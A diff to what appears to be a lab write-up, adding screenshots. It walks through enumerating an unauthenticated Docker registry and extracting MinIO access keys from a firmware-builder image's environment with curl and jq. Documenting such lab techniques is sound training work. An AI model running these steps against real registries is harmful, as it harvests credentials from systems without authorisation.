@@ -29,6 +29,7 @@ Enumerate the PUL Container Registry v2 API, retrieve the firmware-builder image
 ```bash
 curl --max-time 8 -fsS -i http://203.0.3.36:5000/v2/ | sed -n '1,8p'
 ```
+<img width="937" height="284" alt="WindowsTerminal_4ocxETJPFa" src="https://github.com/user-attachments/assets/96ad1cfd-f0a9-49fe-84fc-5a805da3d16f" />
 
 The response is HTTP 200 and includes the Docker Registry v2 header.
 
@@ -37,6 +38,7 @@ The response is HTTP 200 and includes the Docker Registry v2 header.
 ```bash
 curl --max-time 8 -fsS http://203.0.3.36:5000/v2/_catalog | jq .
 ```
+<img width="866" height="253" alt="WindowsTerminal_6ZahuueyeN" src="https://github.com/user-attachments/assets/2e753167-4153-490d-835b-2916ded4a5c5" />
 
 The catalog lists `pul/firmware-builder` and `pul/sonar-runner`.
 
@@ -45,6 +47,7 @@ The catalog lists `pul/firmware-builder` and `pul/sonar-runner`.
 ```bash
 curl --max-time 8 -fsS http://203.0.3.36:5000/v2/pul/firmware-builder/tags/list | jq .
 ```
+<img width="1099" height="284" alt="WindowsTerminal_IgJ9ARxozK" src="https://github.com/user-attachments/assets/54bd87fd-223a-4cda-ab37-180903670650" />
 
 The repository includes `latest`, `v3.2.1`, `v3.1.0`, and `v3.0.5`.
 
@@ -53,6 +56,7 @@ The repository includes `latest`, `v3.2.1`, `v3.1.0`, and `v3.0.5`.
 ```bash
 curl --max-time 8 -fsS http://203.0.3.36:5000/v2/pul/firmware-builder/manifests/latest | jq .
 ```
+<img width="1177" height="363" alt="WindowsTerminal_Oxfa6VtfLG" src="https://github.com/user-attachments/assets/af202a6e-baaf-4bdc-95fa-44f718486a6e" />
 
 The config digest for `latest` is:
 
@@ -70,6 +74,7 @@ export MINIO_ACCESS_KEY="$(jq -r '.config.Env[] | select(startswith("MINIO_ACCES
 export MINIO_SECRET_KEY="$(jq -r '.config.Env[] | select(startswith("MINIO_SECRET_KEY=")) | sub("^[^=]*=";"")' "$RANGE3_DIR/registry-config.json")"
 printf 'MinIO values loaded into this shell; values not printed.\n'
 ```
+<img width="1454" height="248" alt="WindowsTerminal_FddfNr6Rbc" src="https://github.com/user-attachments/assets/40336301-3bf5-48e4-9b37-67125e8647b9" />
 
 The image environment includes MinIO access values. They are redacted in this public writeup. Its `ARTIFACT_STORE_HOST` is the scenario placeholder `11.x.x.x`; the artifact store in this deployment is reachable at `203.0.3.36:9000`.
 
